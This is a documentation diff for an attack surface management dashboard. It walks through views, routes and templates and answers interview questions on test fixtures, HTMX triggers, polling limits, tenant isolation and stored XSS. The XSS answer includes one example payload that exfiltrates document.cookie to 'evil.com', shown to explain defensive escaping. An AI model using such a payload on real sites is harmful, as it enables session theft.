@@ -1862,3 +1862,169 @@ The audit log is accessible via `GET /orgs/{org_id}/audit-events`:
   Production containers and CI test runs build reproducible wheels via Docker. If an external CDN experiences an outage or unpublishes a release, external builds and runtime environments break. Vendored assets guarantee that Docker images build and run reliably in isolated or air-gapped network environments without external internet access.
 - **4. Cryptographic Integrity via `VENDOR.md`:**
   Recording the exact package version, official upstream tarball URL, and cryptographic SHA-256 hash in `src/asm/static/vendor/VENDOR.md` establishes an immutable chain of custody. Any developer, auditor, or automated scanner can verify that the vendored `.js` files match the official upstream releases byte-for-byte without unauthorized modifications or backdoor injections.
+
+---
+
+# Part 10: Phase v3.4b — Scans List, Scan Detail, Fix First & Attack Surface Changes UI
+
+## 1. Plain-English Code Walkthrough
+
+### `src/asm/ui_views.py`
+- **What it is:** Pure presentation logic, data formatting, and view-model extraction functions for the dashboard scans and results views.
+- **Why it exists:** Keeps Jinja2 templates declarative and dumb, and keeps FastAPI route handlers clean of data munging and sorting heuristics.
+- **Key Functions & Types:**
+  - `FormattedFinding` & `FixFirstResult`: Immutable frozen dataclasses representing sanitized, sorted finding records ready for autoescaped template rendering.
+  - `extract_fix_first_findings(score_report)`: Parses the score stage report JSON. Sorts findings by:
+    1. Severity Tier: `CRITICAL` > `HIGH` > `MEDIUM` > `LOW` > `INFO`
+    2. Score Points: Descending
+    3. Host: Ascending (case-insensitive)
+    4. Port: Ascending (`None` port precedes numeric ports)
+    Caps findings at 50 for performance and renders `more_count = max(0, total - 50)`. Computes per-tier counts (`dict.fromkeys(TIER_ORDER, 0)`) across *all* parsed findings before the cap, guaranteeing count cards stay synchronized with the data regardless of the producer's internal dictionary keys.
+  - `format_duration(started_at, finished_at)`: Formats execution duration into human-readable strings (`"--"`, `"In progress"`, `"45s"`, or `"2m 15s"`).
+  - `format_change_summary(change_detection)`: Reads `scan_runs.change_detection` as produced by `worker.py`. Sums non-zero counts across the five tiers (`critical`, `high`, `medium`, `low`, `info`). Renders `"Baseline scan"` for baseline runs, `"No changes"` when total differences are zero, or a comma-separated breakdown (e.g. `"1 critical, 2 info"`).
+  - `check_polling_status(status, created_at, now)`: Returns `(should_poll, is_stale_active)`. If status is `queued` or `running` and `(now - created_at) < 15 minutes`, `should_poll` is `True`. If active but $\ge 15$ minutes old, `should_poll` is `False` and `is_stale_active` is `True`. For all terminal states (`succeeded`, `failed`), both are `False`.
+
+### `src/asm/api/routes_ui.py` (New v3.4b Routes)
+- **`GET /ui/orgs/{org_id}/domains/{domain_id}/scans`**:
+  - Enforces authorization through `require_org_role("viewer")` and tenant domain choke point `get_domain_for_org(db, org_id, domain_id)`.
+  - Queries the latest 20 scans for the domain ordered by `created_at DESC, id DESC`.
+  - Strictly omits loading heavy `ScanResult` JSON reports for table rows, deriving summaries directly from `scan_runs.change_detection`.
+  - Emits `Cache-Control: no-store` and CSP headers via `apply_security_headers`.
+- **`GET /ui/orgs/{org_id}/scans/{scan_id}`**:
+  - Enforces authorization through `require_org_role("viewer")` and tenant scan choke point `get_scan_for_org(db, org_id, scan_id)` (which joins `ScanRun` to `Domain` on `Domain.org_id == org_id`, returning 404 on cross-tenant access).
+  - **IDOR Choke Point Rule:** Queries child `ScanResult` (stage `"score"`) and `ScanChange` entities strictly using `scan_run.id` from the resolved scan entity, never from request URL parameters.
+  - Assembles normalized pipeline stage dictionaries for all 5 stages (`discover`, `probe`, `portscan`, `inspect`, `score`), populating execution status, duration, and errors.
+  - Determines polling state via `check_polling_status(scan_run.status, scan_run.created_at)`.
+
+### `src/asm/templates/partials/scans_list.html`
+- **What it is:** Table fragment displaying the latest 20 scan executions for a domain.
+- **Key Elements:**
+  - Header with `"Back to domain"` navigation button.
+  - Role-gated `"Run scan"` button (rendered only for `admin` and `owner` roles).
+  - When domain is unverified, button is rendered `disabled` with visible text: `"Domain ownership verification required to run scans."`
+  - Table with sentence-case headers: `"Scan ID"`, `"Trigger"`, `"Status"`, `"Started at"`, `"Duration"`, `"Changes"`, `"Actions"`.
+  - Row action: `"View scan"` button triggering fragment navigation.
+  - Footer banner: `"Showing the latest {{ scans_limit }} scans."` when row count reaches the limit (20).
+
+### `src/asm/templates/partials/scan_detail.html`
+- **What it is:** Complete inspection view for a single scan run, findings triage, and attack surface changes.
+- **Key Elements:**
+  - Root container: `<section class="surface-panel" id="scan-detail-container" ...>`. Emits `hx-get`, `hx-target="this"`, `hx-swap="outerHTML"`, and `hx-trigger="every 3s"` *only* when `should_poll` is true. Finished scans omit `hx-get` completely so clicks inside the panel never trigger unwanted re-fetches.
+  - Stale warning banner (rendered when `is_stale_active` is true): `"Still <status> after 15 minutes. Automatic updates have stopped."` with a `"Refresh"` button.
+  - 5-stage progress pipeline cards (`discover`, `probe`, `portscan`, `inspect`, `score`) with stage status badges, durations, and stage errors.
+  - Error banner when `scan_run.error` is present: `"Scan failed:"` followed by the error message.
+  - Fix first: Summary cards for `"Domain score"`, `"Risk band"`, `"Critical"`, `"High"`, `"Medium"`, `"Low"`. Table displaying findings sorted by severity tier, score points, host, and port. Capped at 50 rows with an overflow message: `"... and {{ fix_first.more_count }} more findings."`
+  - Changes detected: Table displaying `ScanChange` records (`Severity`, `Category`, `Change type`, `Asset`, `Detail`, `Evidence`) or `"No changes detected in this scan."`
+  - **Stored-XSS Guard:** All attacker-influenced finding and change strings are rendered strictly as autoescaped text within `<code>` or standard text elements, never within `<a href>`.
+
+### `src/asm/static/js/app.js` (v3.4b Additions)
+- **`btn-run-scan` Handler:** Intercepts click, disables button, sets text to `"Starting scan..."`, generates an idempotency key (`crypto.randomUUID()`), and dispatches an authenticated `POST /orgs/{org_id}/domains/{domain_id}/scans`. Handles 409 (already active) and 422 (unverified) using `showError` (via `textContent`), and navigates to the scan detail view on success.
+- **Navigation Handlers:** Click delegation for `.btn-view-scans`, `.btn-view-scan`, `#btn-back-domain-detail`, `#btn-back-scans`, and `#btn-refresh-scan`.
+- **401 Token Refresh Swap Preservation:** In `htmx:responseError`, the retry mechanism checks the source element's `hx-swap` attribute (`evt.detail.elt.getAttribute('hx-swap')`). If present (e.g. `outerHTML`), it passes `swap: swapStyle` to `htmx.ajax()`, preventing the default `innerHTML` swap from nesting a duplicate `<section>` inside the active container.
+
+---
+
+## 2. Five v3.4b Interview Questions & Answers
+
+### Question 1: What are contract fixtures, why did 424 tests pass while Bugs O and P were present, and how do contract tests prevent UI/worker schema drift?
+**Answer:**
+- **Why 424 Tests Passed with Bugs O and P Present:**
+  - Bug O: In `test_ui_views.py`, the score report fixture was handwritten with invented uppercase keys: `{"counts": {"CRITICAL": 1, "HIGH": 2}}`. The unit tests asserted that `counts["CRITICAL"]` matched the output. The tests passed because the mock fixture matched the mock expectation! In production, however, `scoring.py` produces `{"findings_critical": 1, "findings_high": 2}`. The real UI showed 0 for all count cards.
+  - Bug P: In the scans list, the change detection mock used `{"counts": {"total": 3, "critical": 1, "high": 2}}`. The UI parser checked `counts.get("total")`. Again, test passed against mock. In production, `worker.py` writes counts as a dictionary of five individual tiers (`{"critical": 1, "high": 0, ...}`) with no `"total"` key. The real UI showed "No changes" for completed scans that had actual changes.
+  - In both cases, unit tests tested isolated assumptions against synthetic data rather than the true output shape of the producer.
+- **What Contract Fixtures Are:**
+  Contract fixtures are test payloads generated directly by the real producer code (e.g., calling `ScoreReport(...).to_dict()` or the exact `change_detection` dict the worker writes) rather than handwriting dictionaries in test files.
+- **How to Prevent UI/Worker Drift:**
+  1. *Generate Fixtures from Domain Models:* Build test fixtures using the producer's real factory or dataclass methods. If the producer changes key names, the fixture generation code or consumer tests immediately fail at build time.
+  2. *Schema Validation Tests:* Run JSON schema validation or Pydantic parsing over persisted stage reports and change payloads to guarantee producer and consumer share an identical contract.
+
+---
+
+### Question 2: In HTMX, why does an element with `hx-get` require an explicit `hx-trigger`, and how does omitting `hx-trigger` on a finished scan panel cause accidental re-fetching on click?
+**Answer:**
+- **HTMX Default Trigger Rules:**
+  In HTMX, when an element specifies an AJAX request attribute (`hx-get`, `hx-post`, `hx-put`, `hx-delete`) without an accompanying `hx-trigger`, HTMX assigns a default trigger based on the element tag:
+  - Form elements (`<form>`) default to `submit`.
+  - Input, select, and textarea elements default to `change`.
+  - Every other HTML element (including `<section>`, `<div>`, `<p>`, `<table>`) defaults to `click`!
+- **The Accidental Re-Fetch Bug (Bug Q):**
+  In early development, the scan detail container had:
+  ```html
+  <section id="scan-detail-container"
+    hx-get="/ui/orgs/{{ org.id }}/scans/{{ scan_run.id }}"
+    hx-target="this"
+    hx-swap="outerHTML"
+    {% if should_poll %}hx-trigger="every 3s"{% endif %}>
+  ```
+  While the scan was active (`should_poll = True`), `hx-trigger="every 3s"` was present, so HTMX polled every 3 seconds. Once the scan completed (`status = "succeeded"`), `should_poll` became `False`. The template omitted `hx-trigger`, but left `hx-get` on the `<section>`.
+  Because `<section>` defaults to the `click` trigger, any click inside the completed panel (clicking text to select it, clicking a table row, clicking a code snippet) triggered a full HTTP GET and outerHTML swap!
+- **The Rule for HTMX Templates:**
+  Never emit `hx-get` without an explicit trigger if the element is not intended to be interactive. In `scan_detail.html`, all four polling attributes (`hx-get`, `hx-target`, `hx-swap`, `hx-trigger`) are wrapped in `{% if should_poll %}` so completed panels have zero AJAX attributes.
+
+---
+
+### Question 3: How can network scan evidence lead to stored Cross-Site Scripting (XSS), and what are the two layers of defense used to neutralize it in the dashboard?
+**Answer:**
+- **How Network Evidence Becomes a Stored XSS Vector:**
+  An Attack Surface Management scanner inspects external, attacker-controlled infrastructure:
+  1. *Externally sourced names:* subdomains come from third-party sources such as Certificate Transparency logs and are untrusted input. Discovery filters invalid hostnames (`_is_valid_discovered_name`), but the UI must not depend on that.
+  2. *HTTP Server Headers & Titles:* An attacker's web server can return headers like `Server: <img src=x onerror=fetch('//evil.com/'+document.cookie)>` or `<title><script>...</script></title>`.
+  3. *Port Banners:* An SSH or FTP daemon can output ANSI escape codes or raw HTML in its greeting banner.
+  When the ASM worker stores these strings in `ScanResult` or `ScanChange` tables, and the web dashboard renders them for security analysts, those strings are stored XSS vectors. If rendered into the DOM unsanitized, the attacker's JavaScript executes in the context of the authenticated analyst's session.
+- **Layer 1: Autoescaped Text in Standard Elements (No Links):**
+  Jinja2 template autoescaping is enabled across all partials. Characters like `<`, `>`, `"`, and `'` are converted to HTML entities (`&lt;`, `&gt;`, `&#34;`, `&#39;`). Evidence strings are placed strictly inside `<code>{{ f.evidence }}</code>` or standard table cells.
+  Critically, evidence is *never* converted into active links (`<a href="{{ f.evidence }}">`). Autoescaping inside an `href` attribute does not neutralize `javascript:...` or `data:...` URIs; clicking an escaped `href="javascript:..."` executes arbitrary code!
+- **Layer 2: Defense-in-Depth via Strict Content Security Policy:**
+  Even if an author inadvertently bypassed autoescaping (e.g. using `|safe`), the strict CSP (`default-src 'self'`, no `'unsafe-inline'`, no `'unsafe-eval'`) prevents inline scripts or script attributes from executing, and `connect-src 'self' <SUPABASE_URL>` limits script-driven requests (fetch/XHR) to the app's own origin and Supabase. It does not block every exfiltration path (for example top-level navigation), which is why escaping is the primary defence.
+
+---
+
+### Question 4: Why is live scan polling capped at 15 minutes, what failure modes does this mitigate, and how does the UI gracefully transition when the cap is reached?
+**Answer:**
+- **Why Infinite Polling is an Anti-Pattern:**
+  If an active scan polls every 3 seconds indefinitely:
+  1. *Worker Crashes / Stalled Jobs:* If a background worker pod crashes or hits an unhandled exception without updating `status = "failed"`, the scan remains in `running` state until lease recovery. An open browser tab would poll the database 1,200 times per hour indefinitely.
+  2. *Zombie Tabs & Server Load:* Users frequently leave dashboard tabs open overnight or over weekends. With hundreds of users leaving tabs open, unconstrained polling generates unnecessary database read load and web server CPU consumption.
+  3. *Client-Side Network Congestion:* Indefinite polling on mobile or metered connections wastes battery and bandwidth.
+- **The 15-Minute Threshold:** A judgement call, not a measured percentile. It is long enough for a normal single-domain scan to finish while someone watches, and it bounds the load from a forgotten tab to at most 300 requests (one every 3 seconds for 15 minutes). No scan-duration data has been collected yet; revisit once real timings exist.
+- **Graceful UI Transition:**
+  The server calculates scan age via `check_polling_status(scan_run.status, scan_run.created_at)`. When `age >= 15 minutes`:
+  - `should_poll` returns `False`, omitting `hx-trigger="every 3s"` from the rendered HTML. Polling stops automatically with zero client-side JavaScript timers.
+  - `is_stale_active` returns `True`, rendering an accessible status banner:
+    ```html
+    <div class="banner-stale" role="status">
+      <span>Still running after 15 minutes. Automatic updates have stopped.</span>
+      <button type="button" id="btn-refresh-scan" class="btn btn-secondary btn-sm" ...>Refresh</button>
+    </div>
+    ```
+  - The user can click `"Refresh"` to manually check current progress whenever desired.
+
+---
+
+### Question 5: When rendering `/ui/orgs/{org_id}/scans/{scan_id}`, why are the score `ScanResult` and `ScanChange` child rows loaded strictly via `scan_run.id` from `get_scan_for_org`, and what security vulnerability would occur if query parameters were used instead?
+**Answer:**
+- **The Security Invariant:**
+  In `routes_ui.py`:
+  ```python
+  scan_run = get_scan_for_org(db, org_id, scan_id)
+  
+  # Load score report strictly using scan_run.id:
+  score_result = db.scalars(
+      select(ScanResult).where(
+          ScanResult.scan_run_id == scan_run.id,
+          ScanResult.stage == "score",
+      )
+  ).first()
+
+  # Load changes strictly using scan_run.id:
+  scan_changes = list(db.scalars(
+      select(ScanChange).where(ScanChange.scan_run_id == scan_run.id)
+  ).all())
+  ```
+- **The Vulnerability of Parameter-Driven Queries (IDOR / Parameter Swapping):**
+  Suppose an endpoint accepted separate query parameters, e.g. `/scans/{scan_id}?result_id=123` or loaded child records from raw request variables without scoping to `scan_run.id`:
+  - An attacker in Organization A could pass their own valid `scan_id`, but supply a `result_id` or `scan_run_id` belonging to a confidential scan in Organization B.
+  - If the database query filtered on the child ID without enforcing `ScanResult.scan_run_id == scan_run.id`, the server would return Organization B's vulnerability findings and attack surface delta inside Organization A's dashboard view.
+- **Choke Point Chaining:**
+  `get_scan_for_org` verifies both that the scan exists AND that `Domain.org_id == org_id`. If either condition fails, it raises an anti-enumeration HTTP 404. By chaining all subsequent database queries strictly off the verified `scan_run.id` returned by the choke point, cross-tenant data leaks and parameter-tampering attacks are structurally eliminated.
+
